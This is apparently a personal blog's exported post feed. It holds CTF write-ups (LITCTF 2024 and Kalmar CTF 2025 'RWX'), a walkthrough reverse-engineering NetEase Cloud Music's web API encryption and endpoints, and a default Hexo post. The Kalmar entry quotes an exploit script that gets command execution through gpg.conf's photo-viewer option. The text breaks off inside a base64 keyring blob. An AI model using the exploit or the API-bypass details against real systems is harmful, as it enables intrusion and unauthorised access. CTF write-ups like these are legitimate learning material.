class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l, l + <span class="hljs-number">100</span>):<br>        target_list.append(expect_color[j])<br>    l += <span class="hljs-number">1</span><br><br><br><span class="hljs-comment"># 第三步，根据原始列表color_data和目标列表target_list生成交换列表</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_swap_operations</span>(<span class="hljs-params">original_list, target_list</span>):<br>    n = <span class="hljs-built_in">len</span>(original_list)<br>    swaps = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        <span class="hljs-keyword">if</span> original_list[i] != target_list[i]:<br>            target_pos = original_list[i:].index(target_list[i]) + i<br>            swaps.append([i, target_pos])<br>            original_list[i], original_list[target_pos] = (<br>                original_list[target_pos],<br>                original_list[i],<br>            )<br>    <span class="hljs-keyword">return</span> swaps<br><br><br>swap_operations = find_swap_operations(color_data, target_list)<br><br><span class="hljs-comment"># 第四步，将交换列表提交到服务器</span><br>response = requests.post(<br>    <span class="hljs-string">&quot;http://litctf.org:31780/test&quot;</span>,<br>    headers=&#123;<span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>&#125;,<br>    data=json.dumps(&#123;<span class="hljs-string">&quot;data&quot;</span>: swap_operations&#125;),<br>)<br><br><span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-comment"># LITCTF&#123;yAy_y0u_fixed_e9DS93a&#125;</span><br></code></pre></td></tr></table></figure>
        </div>
      </div>
    </div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a href="https://chanbengz.github.io/">队友</a>太强了，把密码ak了。🥳🥳<br>but我们队没人做pwn，所以最后没有拿到什么好名次。😭<br>整体下来这个比赛还是挺开心的🤭，要说收获也挺多，拿了两个一血（虽然很水），第一次尝试wasm，第一次在ctf写算法题…</p>
]]></content>
      <categories>
        <category>ctfwp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>LITCTF</tag>
        <tag>2024</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次对网易云前端接口的逆向</title>
    <url>/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<h1 id="记一次对网易云前端接口的逆向"><a href="#记一次对网易云前端接口的逆向" class="headerlink" title="记一次对网易云前端接口的逆向"></a>记一次对网易云前端接口的逆向</h1><h2 id="从二维码登录接口入手"><a href="#从二维码登录接口入手" class="headerlink" title="从二维码登录接口入手"></a>从二维码登录接口入手</h2><ol>
<li>界面如图</li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/1-min.png" class="">

<ol start="2">
<li>扫个码看看</li>
</ol>
<p>是一串链接，有一个 <code>codekey</code> 参数</p>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/2-min.png" class="">

<ol start="3">
<li>打开控制台抓包，找到关键的数据包，返回的<code>unikey</code>对应的就是<code>codekey</code></li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/3-min.png" class="">

<ol start="4">
<li>看看payload，两个参数，<code>params</code>和<code>encSecKey</code></li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/4-min.png" class="">

<ol start="5">
<li>点入发起程序</li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/5-min.png" class="">

<ol start="6">
<li>打个断点，刷新并重新触发</li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/6-min.png" class="">

<ol start="7">
<li>看到了熟悉的参数</li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/7-min.png" class="">
<p>下断点看看值<code>t</code></p>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/8-min.png" class="">

<ol start="8">
<li>根据堆栈一步一步往前找到生成参数的位置</li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/9-min.png" class="">

<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/11-min.png" class="">

<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/12-min.png" class="">

<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/13-min.png" class="">

<ol start="9">
<li>找到了</li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/14-min.png" class="">

<ol start="10">
<li>关键部位</li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/15-min.png" class="">

<ol start="11">
<li>打开控制台，先看看<code>params</code>如何生成</li>
</ol>
<ol>
<li><p><code>d</code>的值</p>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/16-min.png" class="">
</li>
<li><p><code>d</code>的赋值代码</p>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javaScript">d = (<span class="hljs-number">0</span>,y.<span class="hljs-property">asrsea</span>)(<br>        <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(c),<br>        (<span class="hljs-number">0</span>,y.<span class="hljs-property">emj2code</span>)([<span class="hljs-string">&quot;流泪&quot;</span>, <span class="hljs-string">&quot;强&quot;</span>]),<br>        y.<span class="hljs-property">BASE_CODE</span>,<br>        (<span class="hljs-number">0</span>,y.<span class="hljs-property">emj2code</span>)([<span class="hljs-string">&quot;爱心&quot;</span>, <span class="hljs-string">&quot;女孩&quot;</span>, <span class="hljs-string">&quot;惊恐&quot;</span>, <span class="hljs-string">&quot;大笑&quot;</span>]<br>    )<br></code></pre></td></tr></table></figure>
<p>其中 <code>(0,y.emj2code)([&quot;流泪&quot;, &quot;强&quot;])</code> 相当于 <code>y.emj2code([&quot;流泪&quot;, &quot;强&quot;])</code></p>
<ol start="3">
<li>进一步发现，这几个值应该都是常量</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javaScript">&gt; <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(c)<br><span class="hljs-string">&#x27;&#123;&quot;type&quot;:1,&quot;noCheckToken&quot;:true&#125;&#x27;</span><br><br>&gt; (<span class="hljs-number">0</span>,y.<span class="hljs-property">emj2code</span>)([<span class="hljs-string">&quot;流泪&quot;</span>, <span class="hljs-string">&quot;强&quot;</span>])<br><span class="hljs-string">&#x27;010001&#x27;</span><br><br>&gt; y.<span class="hljs-property">BASE_CODE</span><br><span class="hljs-string">&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span><br><br>&gt; (y.<span class="hljs-property">emj2code</span>)([<span class="hljs-string">&quot;爱心&quot;</span>, <span class="hljs-string">&quot;女孩&quot;</span>, <span class="hljs-string">&quot;惊恐&quot;</span>, <span class="hljs-string">&quot;大笑&quot;</span>])<br><span class="hljs-string">&#x27;0CoJUm6Qyw8W8jud&#x27;</span><br></code></pre></td></tr></table></figure>

<ol start="4">
<li>接着分析<code>y.asrsea</code>函数</li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/17-min.png" class="">

<p>打个断点，运行到这里</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javaScript">t.<span class="hljs-property">asrsea</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">e, t, n, r</span>) &#123;<span class="hljs-comment">//e,t,n,r是上文中提到的常量</span><br>            <span class="hljs-keyword">var</span> o = &#123;&#125;<br>              , i = <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> t, n = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>, r = <span class="hljs-string">&quot;&quot;</span>, o = <span class="hljs-number">0</span>; o &lt; e; o += <span class="hljs-number">1</span>)<br>                    t = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * n.<span class="hljs-property">length</span>,<br>                    t = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(t),<br>                    r += n.<span class="hljs-title function_">charAt</span>(t);<br>                <span class="hljs-keyword">return</span> r<br>            &#125;(<span class="hljs-number">16</span>);<br>            <span class="hljs-keyword">return</span> o.<span class="hljs-property">encText</span> = <span class="hljs-title function_">a</span>(e, r), <span class="hljs-comment">//进行了两次加密获取到encText</span><br>            o.<span class="hljs-property">encText</span> = <span class="hljs-title function_">a</span>(o.<span class="hljs-property">encText</span>, i),<br>            o.<span class="hljs-property">encSecKey</span> = <span class="hljs-title function_">u</span>(i, t, n),<span class="hljs-comment">//进行一次加密获取到enSecKey</span><br>            o<br>        &#125;<br></code></pre></td></tr></table></figure>

<ol start="5">
<li>看看 <code>a</code> 函数</li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/18-min.png" class="">

<p><code>AES</code>、<code>iv</code>、<code>CBC</code> 没加密字段，一看就知道啥加密方式了 XD</p>
<blockquote>
<p>使用了AES的CBC模式进行加密，<code>e</code>为待加密文本，<code>t</code>为密钥，偏移量<code>iv</code>是<code>0102030405060708</code></p>
</blockquote>
<ol start="6">
<li>验证一下，对上了</li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/19-min.png" class="">

<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/20-min.png" class="">

<ol start="7">
<li>第二次加密同理，使用<code>m3iws/mCg11hFMWMpeAXIJ33nggE141odvQwXdMOvv8=</code>为密文，随机的16位a-zA-Z0-9字符作为密钥。</li>
</ol>
<ol start="12">
<li>再看看 <code>encSecKey</code>怎么生成</li>
</ol>
<ol>
<li>很巧，就在 <code>a</code> 函数附近， <code>u</code> 函数就是用来生成 <code>encSecKey</code> 的</li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/21-min.png" class="">

<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">u</span>(<span class="hljs-params">e, t, n</span>) &#123;<span class="hljs-comment">// e是随机的16位密钥，t是10001(十六进制的65537)，n是前文提到的base_code</span><br>            <span class="hljs-keyword">return</span> i.<span class="hljs-property">default</span>.<span class="hljs-title function_">setMaxDigits</span>(<span class="hljs-number">131</span>),<br>            n = <span class="hljs-keyword">new</span> i.<span class="hljs-property">default</span>.<span class="hljs-title class_">RSAKeyPair</span>(t,<span class="hljs-string">&quot;&quot;</span>,n),<br>            i.<span class="hljs-property">default</span>.<span class="hljs-title function_">encryptedString</span>(n, e)<br>        &#125;<br></code></pre></td></tr></table></figure>
<ol start="2">
<li>三个函数</li>
</ol>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/22-min.png" class="">

<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/23-min.png" class="">

<ol start="3">
<li><p>到这里第一眼没看出来是什么加密方法，看函数名应该和RSA有关。把代码喂给ChatGPT，告诉我是一个<code>nopadding</code>的RSA加密。</p>
</li>
<li><p>开开心心让它写了一段RSA加密的python代码来验证。</p>
<p> 然后傻眼了，加密结果一直在变，前端的加密结果是不变的。</p>
<p> 又花了一段时间在互联网搜寻一番，发现了原来python的rsa没有实现nopadding的加密。。。</p>
<p> 从网上找了一篇解决方案<a href="https://www.cnblogs.com/pythonClub/p/10464745.html">https://www.cnblogs.com/pythonClub/p/10464745.html</a></p>
</li>
<li><p>校验一下，没问题</p>
</li>
</ol>
<h2 id="看看其他的接口"><a href="#看看其他的接口" class="headerlink" title="看看其他的接口"></a>看看其他的接口</h2><p>分析了一下其它的接口，发现用的都是同一套加密方案。</p>
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/24-min.png" class="">
<img src="/2024/02/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BD%91%E6%98%93%E4%BA%91%E5%89%8D%E7%AB%AF%E7%9A%84%E9%80%86%E5%90%91/25-min.png" class="">

<p>于是，在这里简单整理一下收集到的其他接口</p>
<h4 id="获取二维码"><a href="#获取二维码" class="headerlink" title="获取二维码"></a>获取二维码</h4><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">POST /weapi/login/qrcode/unikey<br></code></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="left">POST参数</th>
<th align="left">类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>params</code></td>
<td align="left"><code>string</code></td>
<td align="left"><strong>必选</strong> <code>&#123;&quot;type&quot;:1,&quot;noCheckToken&quot;:true&#125;</code>字符串AES加密结果</td>
</tr>
<tr>
<td align="left"><code>encSecKey</code></td>
<td align="left"><code>string</code></td>
<td align="left"><strong>必选</strong> AES_KEY的RSA加密结果</td>
</tr>
</tbody></table>
<h4 id="获取登录状态"><a href="#获取登录状态" class="headerlink" title="获取登录状态"></a>获取登录状态</h4><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">POST /weapi/login/qrcode/client/login<br></code></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="left">POST参数</th>
<th align="left">类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>params</code></td>
<td align="left"><code>string</code></td>
<td align="left"><strong>必选</strong> <code>&#123;&quot;type&quot;:1,&quot;noCheckToken&quot;:true,&quot;key&quot;:&quot;&#123;codekey&#125;&quot;&#125;</code>字符串AES加密结果,其中<code>&#123;codekey&#125;</code>由<a href="#%E8%8E%B7%E5%8F%96%E4%BA%8C%E7%BB%B4%E7%A0%81">获取二维码</a>接口生成</td>
</tr>
<tr>
<td align="left"><code>encSecKey</code></td>
<td align="left"><code>string</code></td>
<td align="left"><strong>必选</strong> AES_KEY的RSA加密结果</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">返回值</th>
<th align="left">类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>code</code></td>
<td align="left"><code>int</code></td>
<td align="left">800 -&gt; 二维码不存在或已过期<br>801 -&gt; 等待扫码<br>802 -&gt; 授权中<br>803 -&gt; 授权登陆成功</td>
</tr>
<tr>
<td align="left"><code>message</code></td>
<td align="left"><code>string</code></td>
<td align="left">消息</td>
</tr>
</tbody></table>
<h4 id="获取歌曲播放地址"><a href="#获取歌曲播放地址" class="headerlink" title="获取歌曲播放地址"></a>获取歌曲播放地址</h4><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">POST /weapi/song/enhance/player/url/v1?csrf_token=&#123;csrf_token&#125;<br></code></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="left">POST参数</th>
<th align="left">类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>params</code></td>
<td align="left"><code>string</code></td>
<td align="left"><strong>必选</strong> <code>&#123;&quot;ids&quot;:&quot;[&#123;song_id&#125;]&quot;,&quot;level&quot;:&quot;standard&quot;,&quot;encodeType&quot;:&quot;aac&quot;,&quot;csrf_token&quot;:&quot;&#123;csrf_token&#125;&quot;&#125;</code>字符串AES加密结果,其中<code>&#123;codekey&#125;</code>由<a href="#%E8%8E%B7%E5%8F%96%E4%BA%8C%E7%BB%B4%E7%A0%81">获取二维码</a>接口生成</td>
</tr>
<tr>
<td align="left"><code>encSecKey</code></td>
<td align="left"><code>string</code></td>
<td align="left"><strong>必选</strong> AES_KEY的RSA加密结果</td>
</tr>
</tbody></table>
<h4 id="获取歌曲评论"><a href="#获取歌曲评论" class="headerlink" title="获取歌曲评论"></a>获取歌曲评论</h4><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">POST /weapi/comment/resource/comments/get<br></code></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="left">POST参数</th>
<th align="left">类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>params</code></td>
<td align="left"><code>string</code></td>
<td align="left"><strong>必选</strong> <code>&#123;&quot;rid&quot;:&quot;R_SO_4_&#123;song_id&#125;&quot;,&quot;threadId&quot;:&quot;R_SO_4_&#123;song_id&#125;&quot;,&quot;pageNo&quot;:&quot;&#123;pageNo&#125;&quot;,&quot;pageSize&quot;:&quot;&#123;pageSize&#125;&quot;,&quot;cursor&quot;:&quot;&#123;timeStamp&#125;&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&#123;csrf_token&#125;&quot;&#125;</code>字符串AES加密结果,其中<code>&#123;codekey&#125;</code>由<a href="#%E8%8E%B7%E5%8F%96%E4%BA%8C%E7%BB%B4%E7%A0%81">获取二维码</a>接口生成</td>
</tr>
<tr>
<td align="left"><code>encSecKey</code></td>
<td align="left"><code>string</code></td>
<td align="left"><strong>必选</strong> AES_KEY的RSA加密结果</td>
</tr>
</tbody></table>
<p>(完)</p>
]]></content>
      <tags>
        <tag>js逆向</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/12/29/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>[Misc] RWX [Kalmar CTF 2025]</title>
    <url>/2025/03/12/Misc-RWX-Kalmar-CTF-2025/</url>
    <content><![CDATA[<p>A post that records wp.</p>
<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>TBD</p>
<h2 id="Files"><a href="#Files" class="headerlink" title="Files"></a>Files</h2><a href="/2025/03/12/Misc-RWX-Kalmar-CTF-2025/rwx-bronze.zip" title="rwx-bronze.zip">rwx-bronze.zip</a><br>
<a href="/2025/03/12/Misc-RWX-Kalmar-CTF-2025/rwx-bronze.zip" title="rwx-silver.zip">rwx-silver.zip</a><br>
<a href="/2025/03/12/Misc-RWX-Kalmar-CTF-2025/rwx-bronze.zip" title="rwx-gold.zip">rwx-gold.zip</a><br>
<a href="/2025/03/12/Misc-RWX-Kalmar-CTF-2025/rwx-bronze.zip" title="rwx-diamond.zip">rwx-diamond.zip</a>

<h1 id="0x01-RWX-Bronze"><a href="#0x01-RWX-Bronze" class="headerlink" title="0x01 RWX - Bronze"></a>0x01 RWX - Bronze</h1><p>We give you file read, file write and code execution. But can you get the flag? Let’s start out gently.</p>
<p><a href="https://mqcybersec.org/writeups/25-kalmar-rwxbronze/">writeup</a></p>
<h1 id="0x02-RWX-Silver"><a href="#0x02-RWX-Silver" class="headerlink" title="0x02 RWX - Silver"></a>0x02 RWX - Silver</h1><p>We give you file read, file write and code execution. But can you get the flag? Apparently that was too much!</p>
<p><a href="https://mqcybersec.org/writeups/25-kalmar-rwxsilver/">writeup</a></p>
<h1 id="0x03-RWX-Gold"><a href="#0x03-RWX-Gold" class="headerlink" title="0x03 RWX - Gold"></a>0x03 RWX - Gold</h1><p>We give you file read, file write and code execution. But can you get the flag? Let’s reduce that.</p>
<p><a href="https://discord.com/channels/1080522083991293952/1080526288042856448/1348516577909149748">writeup</a></p>
<p>Writeup script from <a href="https://discord.com/channels/1080522083991293952/1080526288042856448/1348516577909149748">discord</a> :</p>
<figure class="highlight py"><table><tr><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-comment"># baseuri = &#x27;http://127.0.0.1:6664&#x27;</span><br>baseuri = <span class="hljs-string">&#x27;https://e7670e20cc2473544d7f83208eac8ba3-42112.inst2.chal-kalmarc.tf&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rwx_read</span>(<span class="hljs-params">filename</span>):<br>    uri = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;baseuri&#125;</span>/read&#x27;</span><br>    uri_param = &#123;<span class="hljs-string">&quot;filename&quot;</span>: filename&#125;<br>    response = requests.get(uri, params=uri_param)<br>    <span class="hljs-keyword">return</span> response.text<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rwx_write</span>(<span class="hljs-params">filename, content</span>):<br>    uri = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;baseuri&#125;</span>/write&#x27;</span><br>    uri_param = &#123;<span class="hljs-string">&#x27;filename&#x27;</span>: filename&#125;<br>    response = requests.post(uri, params=uri_param, data=content)<br>    <span class="hljs-keyword">return</span> response.text<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rwx_exec</span>(<span class="hljs-params">cmd</span>):<br>    uri = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;baseuri&#125;</span>/exec&#x27;</span><br>    uri_param = &#123;<span class="hljs-string">&#x27;cmd&#x27;</span>: quote(cmd)&#125;<br>    response = requests.get(uri, params=uri_param)<br>    <span class="hljs-keyword">return</span> response.text<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># Gold</span><br>    result = rwx_exec(<span class="hljs-string">&#x27;gpg&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(result)<br><br>    gpg_conf_content = (<br>        <span class="hljs-string">&#x27;list-options show-photos\n&#x27;</span><br>        <span class="hljs-string">&#x27;photo-viewer /would you be so kind to provide me with a flag &gt; /tmp/x\n&#x27;</span><br>        <span class="hljs-string">&#x27;list-keys\n&#x27;</span><br>    )<br>    result = rwx_write(<span class="hljs-string">&#x27;/home/user/.gnupg/gpg.conf&#x27;</span>, gpg_conf_content)<br>    <span class="hljs-built_in">print</span>(result)<br><br>    <span class="hljs-comment"># pubring_kbx = Path.home()/&#x27;.gnupg&#x27;/&#x27;pubring.kbx&#x27;</span><br>    <span class="hljs-comment"># pubring_data = pubring_kbx.read_bytes()</span><br>    <span class="hljs-comment"># pubring_data = bytes([])</span><br>    pubring_data = b64decode(<span class="hljs-string">b&#x27;AAAAIAEBAAJLQlhmAAAAAGfOBSdnzgUnAAAAAAAAAAAAAAozAgEAAAAAAIIAAAmdAAIAHP3oWvkoya8eBhK18IkihfAbHhgKAAAAIAAAAACywt5k3kbj5iEbA3AvDDz2h3I99gAAADwAAAAAAAAAAQAMAAACIgAAACQAAAAAAAMABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGfOBksAAAAAmQGNBGfOBWUBDADnjPx/GUOXMNPtQA1qHsYcxAoMLuuFwYVJcqCC0NSNSmwUl1fAncTyFR7BMgajlHEC40e1Gk8M5/ETnvJW7TDplGkCbJhOioFdqcBeG7F3OqPbDy607u+8jDDl3KRBk92rOLHidFLfj13Z31vKGlpvxMYIq1Y5IoAhqPpMAHKTo1ndOh33+pPj9MkRjZ840J+8luklkeP/TpTaGd0blTDI+kpAgH3wolKDA9koim4yPZY7Yuz6uRfW5ipICiOi0k+wMm+QTwfXByKZmuiahlbqXEkWWdW7018cB/tUO7ghSf2tzD0nDMqryCKXt6g192HKOlw4241smBssmkmMiYn7YuatU/QeWDUmNyjT+yiKkmpu81Qkrf0wfuURhfPDMrFw4qt5ZIk/JGIx3YXg7tooVwKsTJ75/2+FQrb2il6an5N63g7kP/hwoq2Ln2oxVqoQIekSGLYc4HmXcydQBtOZAosNDZBAcdSr+unjttU08bZeuTU2kqstLRn47gUlEiEAEQEAAbAMAABncGcBAAAAAAAAtCRSZWFsIG5hbWUgKENvbW1lbnQpIDx1c2VyQGVtYWlsLmNvbT6wDAAAZ3BnAgAAAAAAAIkB0QQTAQoAOxYhBP3oWvkoya8eBhK18IkihfAbHhgKBQJnzgVlAhsDBQsJCAcCAiICBhUKCQgLAgQWAgMBAh4HAheAAAoJEIkihfAbHhgKWVAL/i9yKOnYOpxKoe6/4oYnTpfnOBaTtMwl